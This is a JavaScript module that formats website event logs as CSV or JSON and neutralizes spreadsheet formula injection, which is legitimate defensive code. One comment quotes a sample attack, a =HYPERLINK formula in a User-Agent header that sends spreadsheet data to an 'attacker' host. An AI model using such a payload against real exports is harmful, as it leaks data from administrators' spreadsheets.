'use strict';

/**
 * exportFormatter.js — Converts event arrays to CSV or JSON for file download.
 *
 * CSV output:
 *   - One header row with field names
 *   - One data row per event
 *   - RFC 4180 quoting (wrap in double-quotes when value contains comma, newline, or quote)
 *   - Windows-style CRLF line endings (broadest spreadsheet compatibility)
 *
 * JSON output:
 *   - Pretty-printed JSON array (2-space indent)
 */

/** Canonical order of fields in CSV/JSON exports */
const EVENT_FIELDS = [
  'timestamp',
  'path',
  'method',
  'statusCode',
  'durationMs',
  'referrer',
  'userAgent',
  'isBot',
  'botName',
  'ipArea',
  'sessionHash',
  'isAuthenticated',
  'isAdmin',
];

/**
 * Characters that make a spreadsheet treat a cell as a FORMULA rather than text.
 * Tab and CR are included because several tools strip leading whitespace before
 * deciding, so "\t=1+1" is evaluated just like "=1+1".
 */
const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Neutralizes formula injection by prefixing a single quote — the marker every
 * major spreadsheet reads as "what follows is text".
 *
 * WHY THIS EXISTS. `path`, `referrer` and `userAgent` are copied from HTTP
 * requests, so their content is chosen by ANYONE who visits the site, with no
 * privileged access; the export is then opened by an administrator. Without this,
 * a `User-Agent: =HYPERLINK("http://attacker/"&A1)` becomes a live formula in the
 * admin's spreadsheet. RFC 4180 quoting does NOT help: the spreadsheet evaluates
 * the content inside the quotes.
 *
 * Applied to STRING values only. Numbers and booleans cannot carry a formula, and
 * skipping them keeps a legitimately negative number a number instead of turning
 * it into text.
 *
 * @param {*} val - Raw value from the event
 * @returns {string}
 */
function neutralizeFormula(val) {
  const str = String(val);
  if (typeof val !== 'string' || str.length === 0) return str;
  return FORMULA_TRIGGERS.includes(str[0]) ? `'${str}` : str;
}

/**
 * Formats an array of events as a CSV string.
 *
 * @param {object[]} events
 * @returns {string} UTF-8 CSV string
 */
function formatCsv(events) {
  const rows = [EVENT_FIELDS.join(',')];

  for (const ev of events) {
    const row = EVENT_FIELDS.map(field => {
      const val = ev[field];
      if (val === null || val === undefined) return '';
      // Neutralize BEFORE quoting: the prefix must end up inside the quotes,
      // otherwise it would break the RFC 4180 framing.
      const str = neutralizeFormula(val);
      // RFC 4180: wrap in quotes if value contains comma, double-quote, or newline
      if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
        return '"' + str.replace(/"/g, '""') + '"';
      }
      return str;
    });
    rows.push(row.join(','));
  }

  return rows.join('\r\n');
}

/**
 * Formats an array of events as a pretty-printed JSON string.
 *
 * @param {object[]} events
 * @returns {string} JSON string
 */
function formatJson(events) {
  return JSON.stringify(events, null, 2);
}

module.exports = { formatCsv, formatJson, neutralizeFormula, EVENT_FIELDS, FORMULA_TRIGGERS };
